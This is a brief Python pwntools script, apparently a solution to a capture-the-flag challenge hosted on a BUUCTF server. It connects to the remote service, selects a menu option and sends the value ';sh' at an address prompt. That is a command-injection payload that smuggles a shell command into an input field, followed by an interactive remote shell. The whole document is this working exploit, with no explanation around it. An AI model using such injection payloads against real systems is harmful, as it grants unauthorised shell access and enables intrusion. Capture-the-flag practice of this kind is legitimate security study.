from pwn import *

r = remote('node5.buuoj.cn', 27938)

r.sendlineafter(b'choose:', b'1')

payload = b';sh'
r.sendlineafter(b'address:', payload)
r.interactive()
